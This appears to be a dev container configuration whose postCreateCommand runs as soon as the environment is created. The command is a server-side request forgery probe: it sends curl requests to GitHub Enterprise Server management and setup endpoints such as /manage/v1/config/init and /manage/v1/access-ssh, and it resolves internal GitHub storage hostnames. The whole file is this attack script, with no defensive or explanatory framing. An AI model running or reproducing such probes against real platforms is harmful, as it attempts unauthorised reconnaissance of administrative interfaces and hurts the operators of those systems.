name: SSRF Test - GHES Internal Endpoints
postCreateCommand: bash -c 'echo "=== GHES INTERNAL SSRF $(date) ==="; for endpoint in "/manage/v1/config/init" "/manage/v1/config/nodes" "/manage/v1/access-ssh" "/api/v3/meta" "/api/v3/rate_limit" "/setup/api/start" "/setup/api/configcheck" "/_private/" "/_internal/"; do echo "Testing ghe.io:8443$endpoint"; curl -sv -m 5 "http://ghe.io:8443$endpoint" 2>&1 | head -15; curl -sv -m 5 "https://ghe.io:8443$endpoint" 2>&1 | head -15; echo ""; done; echo "=== INTERNAL GITHUB SERVICES ==="; for svc in "github-production-repository-file-5c1aeb.s3.amazonaws.com" "github-cloud.s3.amazonaws.com" "github.githubassets.com" "avatars.githubusercontent.com" "raw.githubusercontent.com"; do echo -n "$svc: "; dig +short $svc | head -1 || echo "NXDOMAIN"; done'
